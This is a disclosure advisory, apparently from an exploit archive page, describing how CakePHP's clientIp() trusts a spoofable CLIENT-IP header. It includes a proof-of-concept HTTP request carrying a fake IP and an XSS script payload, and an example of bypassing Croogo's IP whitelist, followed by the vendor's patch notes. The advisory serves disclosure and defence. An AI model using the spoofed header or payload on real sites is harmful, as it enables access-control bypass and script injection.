```
=============================================
- Release date: 12.05.2016
- Discovered by: Dawid Golunski
- Severity: Medium
=============================================

I. VULNERABILITY
-------------------------

CakePHP Framework  <= 3.2.4      IP Spoofing Vulnerability
		      3.1.11
		      2.8.1
		      2.7.10
		      2.6.12

II. BACKGROUND
-------------------------

- CakePHP Framework

http://cakephp.org/

"CakePHP makes building web applications simpler, faster and require less code.

CakePHP is a modern PHP 5.4+ framework with a flexible Database access layer
and a powerful scaffolding system that makes building both small and complex
systems a breeze. "

III. INTRODUCTION
-------------------------

CakePHP Framework contains a vulnerability that allows to spoof the source IP
address. This can allow to bypass access control lists, or injection of
malicious data which, if treated as sanitized by an unaware CakePHP-based
application, can lead to other vulnerabilities such as SQL injection, XSS,
command injection etc.

IV. DESCRIPTION
-------------------------

Both branches of CakePHP Framework (2.x, 3.x) contain a clientIp() method that
allows to obtain the IP address of a client accessing a CakePHP-based
application. The is slightly different in each branch:

CakePHP 2.x:

------[ Cake/Network/CakeRequest.php ]------

        public function clientIp($safe = true) {
                if (!$safe && env('HTTP_X_FORWARDED_FOR')) {
                        $ipaddr = preg_replace('/(?:,.*)/', '', env('HTTP_X_FORWARDED_FOR'));
                } else {
                        if (env('HTTP_CLIENT_IP')) {
                                $ipaddr = env('HTTP_CLIENT_IP');
                        } else {
                                $ipaddr = env('REMOTE_ADDR');
                        }
                }

                if (env('HTTP_CLIENTADDRESS')) {
                        $tmpipaddr = env('HTTP_CLIENTADDRESS');

                        if (!empty($tmpipaddr)) {
                                $ipaddr = preg_replace('/(?:,.*)/', '', $tmpipaddr);
                        }
                }
                return trim($ipaddr);
        }

--------------------------------------------

CakePHP 3.x:

------[ cakephp/src/Network/Request.php ]------

    /**
     * Get the IP the client is using, or says they are using.
     *
     * @return string The client IP.
     */
    public function clientIp()
    {
        if ($this->trustProxy && $this->env('HTTP_X_FORWARDED_FOR')) {
            $ipaddr = preg_replace('/(?:,.*)/', '', $this->env('HTTP_X_FORWARDED_FOR'));
        } else {
            if ($this->env('HTTP_CLIENT_IP')) {
                $ipaddr = $this->env('HTTP_CLIENT_IP');
            } else {
                $ipaddr = $this->env('REMOTE_ADDR');
            }
        }

        if ($this->env('HTTP_CLIENTADDRESS')) {
            $tmpipaddr = $this->env('HTTP_CLIENTADDRESS');

            if (!empty($tmpipaddr)) {
                $ipaddr = preg_replace('/(?:,.*)/', '', $tmpipaddr);
            }
        }
        return trim($ipaddr);
    }

--------------------------------------------

Both of the methods contain the same vulnerability. Despite the safe flag
(CakePHP 2.x), and trustyProxy flag (CakePHP 3.x) set to off by default, they
both use HTTP_CLIENT_IP request header (if it exists) instead of the
REMOTE_ADDR variable set by the web server.

The HTTP_CLIENT_IP header can easily be spoofed by sending CLIENT-IP header
in a HTTP request.

V. PROOF OF CONCEPT EXPLOIT
-------------------------

A) Simple PoC

Download a vulnerable version of CakePHP framework and edit
src/Template/Pages/home.ctp to include the PoC code below
which echoes the visitor's IP using the clientIp() method:

-------[ src/Template/Pages/home.ctp ]--------

<?php

[...]

use Cake\Cache\Cache;
use Cake\Core\Configure;
use Cake\Datasource\ConnectionManager;
use Cake\Error\Debugger;
use Cake\Network\Exception\NotFoundException;

$this->layout = false;

if (!Configure::read('debug')):
    throw new NotFoundException();
endif;

$cakeDescription = 'CakePHP: the rapid development php framework';

echo "PoC \n<br> Your IP is: [". $this->request->clientIp() ."]\n\n<br><br>";

[...]

?>

----------------------------------------------

If we send the following request with CLIENT-IP header containing an arbitrary
IP and malicious XSS data:

GET /cake/cake3/ HTTP/1.1
Host: centos
CLIENT-IP: 100.200.300.400 <script>alert('poc');</script>
Content-Length: 2

the application will give the following response:

HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8

PoC
<br> Your IP is: [100.200.300.400 <script>alert('poc');</script>]

[...]

As we can see the clientIp() method returns the fake IP and XSS payload
from CLIENT-IP header.

B) Croogo CMS exploit

An example application vulnerable to this bug is Croogo CMS:

https://croogo.org/

"Croogo is a free, open source, content management system for PHP,
released under The MIT License. It is powered by CakePHP MVC framework.
It was first released on October 07, 2009"

In one of its scripts we can find the isWhitelistedRequest() which
takes care of ACLs:

-------[ Vendor/croogo/croogo/Croogo/Lib/CroogoRouter.php ]--------

/**
 * Check wether request is from a whitelisted IP address
 *
 * @see CakeRequest::addDetector()
 * @param $request CakeRequest Request object
 * @return boolean True when request is from a whitelisted IP Address
 */
        public static function isWhitelistedRequest(CakeRequest $request) {
                if (!$request) {
                        return false;
                }
                $clientIp = $request->clientIp();
                $whitelist = array_map(
                        'trim',
                        (array)explode(',', Configure::read('Site.ipWhitelist'))
                );
                return in_array($clientIp, $whitelist);
        }

-------------------------------------------------------------------

As we can see, it uses the affected clientIp() function from CakePHP framework.

VI. BUSINESS IMPACT
-------------------------

This vulnerability could be used to bypass access control lists to get
access to sensitive data, or lead to higher severity vulnerabilities
if untrusted data returned by clientIp() method is treated as safe and used
without appropriate sanitization within SQL queries, system command calls etc.

VII. SYSTEMS AFFECTED
-------------------------

According to the vendor, the following versions of CakePHP framework should be
affected by this issue.

3.1.11
3.2.4
2.8.1
2.7.10
2.6.12

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

I. VULNERABILITY
-------------------------
CakePHP Framework <= 3.2.4 IP Spoofing Vulnerability
3.1.11
2.8.1
2.7.10
2.6.12
II. BACKGROUND
-------------------------
- CakePHP Framework
http://cakephp.org/
"CakePHP makes building web applications simpler, faster and require less code.
CakePHP is a modern PHP 5.4+ framework with a flexible Database access layer
and a powerful scaffolding system that makes building both small and complex
systems a breeze. "
III. INTRODUCTION
-------------------------
CakePHP Framework contains a vulnerability that allows to spoof the source IP
address. This can allow to bypass access control lists, or injection of
malicious data which, if treated as sanitized by an unaware CakePHP-based
application, can lead to other vulnerabilities such as SQL injection, XSS,
command injection etc.
IV. DESCRIPTION
-------------------------
Both branches of CakePHP Framework (2.x, 3.x) contain a clientIp() method that
allows to obtain the IP address of a client accessing a CakePHP-based
application. The is slightly different in each branch:
CakePHP 2.x:
------[ Cake/Network/CakeRequest.php ]------
public function clientIp($safe = true) {
if (!$safe && env('HTTP\_X\_FORWARDED\_FOR')) {
$ipaddr = preg\_replace('/(?:,.\*)/', '', env('HTTP\_X\_FORWARDED\_FOR'));
} else {
if (env('HTTP\_CLIENT\_IP')) {
$ipaddr = env('HTTP\_CLIENT\_IP');
} else {
$ipaddr = env('REMOTE\_ADDR');
}
}
if (env('HTTP\_CLIENTADDRESS')) {
$tmpipaddr = env('HTTP\_CLIENTADDRESS');
if (!empty($tmpipaddr)) {
$ipaddr = preg\_replace('/(?:,.\*)/', '', $tmpipaddr);
}
}
return trim($ipaddr);
}
--------------------------------------------
CakePHP 3.x:
------[ cakephp/src/Network/Request.php ]------
/\*\*
\* Get the IP the client is using, or says they are using.
\*
\* @return string The client IP.
\*/
public function clientIp()
{
if ($this->trustProxy && $this->env('HTTP\_X\_FORWARDED\_FOR')) {
$ipaddr = preg\_replace('/(?:,.\*)/', '', $this->env('HTTP\_X\_FORWARDED\_FOR'));
} else {
if ($this->env('HTTP\_CLIENT\_IP')) {
$ipaddr = $this->env('HTTP\_CLIENT\_IP');
} else {
$ipaddr = $this->env('REMOTE\_ADDR');
}
}
if ($this->env('HTTP\_CLIENTADDRESS')) {
$tmpipaddr = $this->env('HTTP\_CLIENTADDRESS');
if (!empty($tmpipaddr)) {
$ipaddr = preg\_replace('/(?:,.\*)/', '', $tmpipaddr);
}
}
return trim($ipaddr);
}
--------------------------------------------
Both of the methods contain the same vulnerability. Despite the safe flag
(CakePHP 2.x), and trustyProxy flag (CakePHP 3.x) set to off by default, they
both use HTTP\_CLIENT\_IP request header (if it exists) instead of the
REMOTE\_ADDR variable set by the web server.
The HTTP\_CLIENT\_IP header can easily be spoofed by sending CLIENT-IP header
in a HTTP request.
V. PROOF OF CONCEPT EXPLOIT
-------------------------
A) Simple PoC
Download a vulnerable version of CakePHP framework and edit
src/Template/Pages/home.ctp to include the PoC code below
which echoes the visitor's IP using the clientIp() method:
-------[ src/Template/Pages/home.ctp ]--------
php
[...]
use Cake\Cache\Cache;
use Cake\Core\Configure;
use Cake\Datasource\ConnectionManager;
use Cake\Error\Debugger;
use Cake\Network\Exception\NotFoundException;
$this-layout = false;
if (!Configure::read('debug')):
throw new NotFoundException();
endif;
$cakeDescription = 'CakePHP: the rapid development php framework';
echo "PoC \n
 Your IP is: [". $this->request->clientIp() ."]\n\n

";
[...]
?>
----------------------------------------------
If we send the following request with CLIENT-IP header containing an arbitrary
IP and malicious XSS data:
GET /cake/cake3/ HTTP/1.1
Host: centos
CLIENT-IP: 100.200.300.400
Content-Length: 2
the application will give the following response:
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
PoC

 Your IP is: [100.200.300.400 ]
[...]
As we can see the clientIp() method returns the fake IP and XSS payload
from CLIENT-IP header.
B) Croogo CMS exploit
An example application vulnerable to this bug is Croogo CMS:
https://croogo.org/
"Croogo is a free, open source, content management system for PHP,
released under The MIT License. It is powered by CakePHP MVC framework.
It was first released on October 07, 2009"
In one of its scripts we can find the isWhitelistedRequest() which
takes care of ACLs:
-------[ Vendor/croogo/croogo/Croogo/Lib/CroogoRouter.php ]--------
/\*\*
\* Check wether request is from a whitelisted IP address
\*
\* @see CakeRequest::addDetector()
\* @param $request CakeRequest Request object
\* @return boolean True when request is from a whitelisted IP Address
\*/
public static function isWhitelistedRequest(CakeRequest $request) {
if (!$request) {
return false;
}
$clientIp = $request->clientIp();
$whitelist = array\_map(
'trim',
(array)explode(',', Configure::read('Site.ipWhitelist'))
);
return in\_array($clientIp, $whitelist);
}
-------------------------------------------------------------------
As we can see, it uses the affected clientIp() function from CakePHP framework.
VI. BUSINESS IMPACT
-------------------------
This vulnerability could be used to bypass access control lists to get
access to sensitive data, or lead to higher severity vulnerabilities
if untrusted data returned by clientIp() method is treated as safe and used
without appropriate sanitization within SQL queries, system command calls etc.
VII. SYSTEMS AFFECTED
-------------------------
According to the vendor, the following versions of CakePHP framework should be
affected by this issue.
3.1.11
3.2.4
2.8.1
2.7.10
2.6.12
VIII. SOLUTION
-------------------------
The vendor has released patched versions.

# CakePHP 2.6.13, 2.7.11, 2.8.2, 3.0.17, 3.1.12, and 3.2.5 Released

The CakePHP core team is happy to announce the immediate availability of CakePHP
2.6.13, 2.7.11, 2.8.2, 3.0.17, 3.1.12, and 3.2.5. These releases contain security
fixes. 3.2.5 and 2.8.2 also contain bugfixes.

## Security Fixes

These releases contain fixes for arbitrary address spoofing when using the
clientIp() method of the request object. Previously, this method would use
the HTTP\_CLIENT\_IP header which can be spoofed easily. If you are using this
method as a source of trusted data we recommend you upgrade. We’d like to thank
the independent security researcher Dawid Golunski for discovering this
vulnerability in CakePHP which was reported to us by Beyond Security’s
SecuriTeam Secure Disclosure program.

## Bugfixes in 2.8.2

* Notice errors in request->referer() in PHP7 with no referrer were fixed.
  (@phlyper)
* Email logs now include the subject and to headers when using the
  MailTransport (@garas)
* Updated API documentation (@xhs345)
* A regression in DbAcl introduced in 2.8.1 was fixed around how inherited
  permissions and explicit deny permissions interacted (@markstory)

## Bugfixes in 3.2.5

* Postgres schema reflection performs better on large databases. (@donkeyx,
  @markstory)
* Xcache cache engine can now store objects (@SmiSoft)
* Malformed HTTP Range headers no longer emit warnings. (@markstory)
* Improved API documentation (@markstory, @curtisgibby, @dereuromark)
* The \_\_xn and \_\_dxn functions now correctly use plural forms.
  (@chinpei215)

## New Features in 3.2.5

* assertCookieNotSet was added to IntegrationTestCase. (@lorenzo)
* The ‘obj’ fetch type was added to PDOStatement. (@davalb)

As always, a huge thanks to all the community members that helped make this
release happen by reporting issues and sending pull requests.
